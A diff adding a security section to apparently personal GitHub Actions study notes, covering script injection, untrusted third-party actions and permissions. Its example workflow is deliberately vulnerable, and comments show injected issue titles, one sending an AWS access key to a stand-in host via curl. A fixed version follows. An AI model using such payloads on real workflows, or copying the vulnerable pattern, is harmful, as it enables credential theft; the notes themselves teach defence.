@@ -925,7 +925,7 @@ on:
     # set outputs of this workflow
     outputs:
       result:
-        description: The result olf the deployment operation
+        description: The result of the deployment operation
         # use jobs context object
         value: ${{ jobs.deploy.outputs.outcome }}
 
@@ -1121,3 +1121,61 @@ jobs:
           echo "MONGODB_USERNAME: $MONGODB_USERNAME"
           echo "${{ env.PORT }}"
 ```
+
+## Permissions & Security
+
+### Script Injection
+
+- a value, set outside a `workflow`, is used in a `workflow`
+- example: issue title used in a `workflow` shell command
+- `workflow` or `command` behavior could be changed
+
+```yml
+# Example
+name: Label Issues (Script Injection Example)
+on:
+  issues:
+    types:
+      - opened
+jobs:
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        # code is risky: is open to script injection
+        # e.g. if issue is opend, you can inject any commands in title
+        # a"; echo Got your secrets"
+        # a"; curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID"
+        run: |
+          issue_title="${{ github.event.issue.title }}"
+          if [[ "$issue_title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+  # non risky option
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        env:
+          TITLE: ${{ github.event.issue.title }}
+        run: |
+          if [[ "$TITLE" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+```
+
+### Malicious Third-Party Actions
+
+- `actions` can perform any logic, including potentially malicious logic
+- example: a third-party action that reads and exports your secrets
+- only use trusted `actions` and inspect code of unknown/untrusted authors
+
+### Permission Issues
+
+- consider avoiding overly permissive permissions
+- example: only allow checking out code (`read-only`)
+- GitHub Actions supports fine-grained permissions control
